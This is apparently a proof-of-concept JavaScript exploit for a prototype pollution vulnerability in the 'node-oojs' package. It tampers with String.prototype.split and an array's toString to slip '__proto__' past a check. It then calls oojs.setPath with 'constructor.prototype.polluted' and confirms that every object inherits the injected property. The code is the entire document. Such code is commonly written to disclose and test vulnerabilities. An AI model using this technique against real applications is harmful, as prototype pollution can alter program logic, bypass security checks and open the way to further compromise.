var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
require('node-oojs');
oojs.setPath({ 'constructor.prototype.polluted': 'yes' });
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}